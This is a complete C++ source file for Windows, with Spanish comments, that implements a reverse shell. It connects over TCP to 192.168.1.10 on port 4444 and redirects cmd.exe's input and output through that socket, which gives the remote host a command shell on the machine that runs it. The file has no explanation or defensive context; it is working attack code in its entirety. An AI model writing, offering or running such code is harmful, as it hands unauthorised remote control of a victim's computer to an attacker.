#include <iostream>
#include <winsock2.h>
#include <stdio.h>

#pragma comment(lib, "ws2_32")

WSADATA wsaData;
SOCKET Socket;
STARTUPINFO si;
PROCESS_INFORMATION pi;
struct sockaddr_in server;

int main() {
    // Inicializar Winsock
    WSAStartup(MAKEWORD(2, 2), &wsaData);
    Socket = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);

    // Detalles del servidor
    server.sin_family = AF_INET;
    server.sin_port = htons(4444);  // Puerto
    server.sin_addr.s_addr = inet_addr("192.168.1.10"); // IP del servidor

    // Conectar al servidor
    if (WSAConnect(Socket, (SOCKADDR*)&server, sizeof(server), NULL, NULL, NULL, NULL) == SOCKET_ERROR) {
        closesocket(Socket);
        WSACleanup();
        return 1;
    }

    // Configurar STARTUPINFO
    memset(&si, 0, sizeof(si));
    si.cb = sizeof(si);
    si.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
    si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE)Socket;

    // Crear un proceso que ejecuta el shell
    TCHAR commandLine[256] = L"cmd.exe";
    CreateProcess(NULL, commandLine, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);

    WaitForSingleObject(pi.hProcess, INFINITE);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    closesocket(Socket);
    WSACleanup();
    return 0;
}
